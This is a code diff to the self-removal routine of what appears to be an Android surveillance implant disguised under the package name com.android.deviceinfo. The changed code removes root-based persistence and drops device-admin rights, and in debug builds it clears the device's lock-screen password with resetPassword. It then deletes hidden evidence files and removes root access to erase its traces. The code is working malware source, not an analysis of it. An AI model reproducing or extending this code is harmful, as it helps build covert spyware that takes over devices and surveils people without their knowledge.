@@ -16,11 +16,13 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Persistence;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.evidence.EvidenceCollector;
@@ -69,24 +71,24 @@ public class UninstallAction extends SubActionSlow {
 		}
 
 		// check Core.taskInit
-		final Markup markup = new Markup(0);
-		markup.createEmptyMarkup();
+		Core.self().createMarkup();
 
 		removeAdmin(Status.getAppContext());
 
-		if (Root.isRootShellInstalled()) {
+		if (PackageInfo.checkRoot()) {
 			Persistence p = new Persistence(Status.getAppContext());
 			p.removePersistance();
 		}
-		
+
 		boolean ret = stopServices();
 		ret &= removeFiles();
-		ret &= deleteApplication();	
+		ret &= deleteApplication();
 		ret &= removeRoot();
 
+		System.gc();
 		return ret;
 	}
-	
+
 	private static boolean removeRoot() {
 		if (Status.haveRoot() == true) {
 			Process localProcess;
@@ -100,7 +102,7 @@ public class UninstallAction extends SubActionSlow {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
-				
+
 				return false;
 			}
 		}
@@ -112,10 +114,24 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeAdmin) ");
 		}
-		
+
 		ComponentName devAdminReceiver = new ComponentName(appContext, AR.class);
 		DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
-		dpm.removeActiveAdmin(devAdminReceiver);
+		if (dpm.isAdminActive(devAdminReceiver)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (removeAdmin) Admin");
+			}
+			if (Cfg.DEBUG) { Check.asserts(Status.self().haveAdmin(), " (removeAdmin) Assert failed, Status doesn't know about admin"); }
+			
+			if(Cfg.DEBUG){
+				dpm.resetPassword("", 0);
+			}
+			dpm.removeActiveAdmin(devAdminReceiver);
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (removeAdmin) no admin");
+			}
+		}
 	}
 
 	/**
@@ -131,7 +147,7 @@ public class UninstallAction extends SubActionSlow {
 		ManagerModule.self().stopAll();
 		ManagerEvent.self().stopAll();
 		Status.unTriggerAll();
-		
+
 		return true;
 	}
 
@@ -148,22 +164,22 @@ public class UninstallAction extends SubActionSlow {
 		Markup.removeMarkups();
 
 		final int fileNum = EvidenceCollector.self().removeHidden();
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
 		}
-		
+
 		return true;
 	}
 
 	private static boolean deleteApplication() {
 		boolean ret = false;
-		
+
 		if (Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) try Root");
 			}
-			
+
 			ret = deleteApplicationRoot();
 		}
 
@@ -171,7 +187,7 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (deleteApplication) go with intent");
 		}
-		
+
 		ret = deleteApplicationIntent();
 		// }
 
@@ -208,13 +224,13 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEMO) {
 			Beep.beepExit();
 		}
-		
+
 		boolean ret = Root.uninstallRoot();
-		
+
 		if (Cfg.DEMO) {
 			Beep.beepPenta();
 		}
-		
+
 		return ret;
 	}
 
